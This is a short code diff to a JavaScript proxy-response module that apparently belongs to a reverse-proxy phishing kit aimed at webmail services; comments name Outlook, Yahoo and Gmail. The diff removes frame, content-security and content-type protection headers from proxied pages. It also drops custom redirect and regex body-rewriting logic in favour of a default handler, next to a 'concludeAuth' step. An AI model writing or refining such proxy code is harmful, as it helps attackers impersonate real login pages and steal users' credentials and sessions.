@@ -179,7 +179,7 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
 
 
     processResponse(clientContext) {
-        // Simple response handling like Outlook/Yahoo
+        // Simple response handling like working services
         this.browserEndPoint.removeHeader('X-Frame-Options')
         this.browserEndPoint.removeHeader('Content-Security-Policy')
         this.browserEndPoint.removeHeader('X-Content-Type-Options')
@@ -189,30 +189,7 @@ const ProxyResponse = class extends globalWorker.BaseClasses.BaseProxyResponseCl
             return this.proxyResp.pipe(this.browserEndPoint)
         }
 
-        // Simple redirect handling
-        const extRedirectObj = super.getExternalRedirect()
-        if (extRedirectObj !== null) {
-            const rLocation = extRedirectObj.url
-            console.log('Redirect detected:', rLocation)
-            // Let Gmail redirects pass through normally
-            return super.processResponse(clientContext)
-        }
-
-        // Apply basic regex replacements
-        let newMsgBody;
-        return this.superPrepareResponse(true)
-            .then((msgBody) => {
-                newMsgBody = msgBody
-                for (let i = 0; i < this.regexes.length; i += 1) {
-                    const regExObj = this.regexes[i]
-                    if (regExObj.reg.test(newMsgBody)) {
-                        newMsgBody = newMsgBody.replace(regExObj.reg, regExObj.replacement)
-                    }
-                }
-                this.superFinishResponse(newMsgBody)
-            }).catch((err) => {
-            console.error(err)
-        })
+        return super.processResponse(clientContext)
     }
 
     concludeAuth() {
